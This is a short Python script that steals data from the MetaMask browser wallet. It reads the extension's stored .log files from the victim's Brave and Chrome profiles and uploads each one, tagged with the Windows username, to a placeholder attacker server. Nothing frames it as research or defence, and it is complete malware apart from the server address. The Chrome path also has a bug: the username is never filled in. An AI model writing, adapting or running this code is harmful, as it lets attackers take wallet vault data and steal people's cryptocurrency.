import os
import requests
import getpass


sys_username = getpass.getuser()

def upload_logs_to_server(logs_directory, token, sys_username):
    url = 'http://your_server_ip:5000/your_secret_token/upload'  # Set IP address
    headers = {'Authorization': token}

    log_files = [f for f in os.listdir(logs_directory) if f.endswith('.log')]

    for log_file in log_files:
        file_path = os.path.join(logs_directory, log_file)
        file_to_upload = [('file', (f'{sys_username}_{log_file}', open(file_path, 'rb')))]

        response = requests.post(url, headers=headers, files=file_to_upload)

        if response.status_code == 200:
            print(f'File {log_file} uploaded successfully.')
        else:
            print(f'Error uploading {log_file}: {response.text}')


token = 'your_secret_token'


logs_directory_brave = rf'C:\Users\{sys_username}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn'
logs_directory_chrome = r'C:\Users\{sys_username}\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn'


upload_logs_to_server(logs_directory_brave, token, sys_username)
upload_logs_to_server(logs_directory_chrome, token, sys_username)
